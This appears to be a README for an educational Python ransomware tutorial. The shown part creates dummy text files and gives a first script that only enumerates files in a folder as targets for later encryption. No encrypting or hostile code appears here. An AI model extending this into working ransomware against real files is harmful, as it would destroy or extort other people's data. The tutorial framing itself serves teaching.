# Ransomware

This is an example application featured in NetworkChuck's <a href="https://youtu.be/UtMMjXOlRQc">Python Malware Tutorial</a>.

### Instructions

Make a folder called ``ransomware`` and create a few random ``.txt`` files with some silly phrases in them:

<pre>
<code>$ mkdir ransomware
$ cd ransomware
$ echo "This is a file" > file.txt
$ echo "Leave me alone" > file2.txt
$ echo "Another one" > hey.txt
$ echo "one more" > pleasedonthurtme.txt</code>
</pre>

Now let's hold these files for ransom! Let's encrypt those suckers right now! Here we go:

<pre>
<code>$ nano voldemort.py</code>
</pre>

Write this code in the following ``voldemort.py`` file:

<details>
<summary>💻 First example of holding these files for ransom:</summary>

```python
#!/usr/bin/env python3
import os

# Let's find some files!
files = []

for file in os.listdir():
    if file == "voldemort.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
```
</details>

When you first run ``voldemort.py`` in your terminal, you should see the following output:

<pre>
<code>$ python voldemort.py
['hey.txt', 'pleasedonthurtme.txt', 'file.txt', 'file2.txt']</code>
</pre>
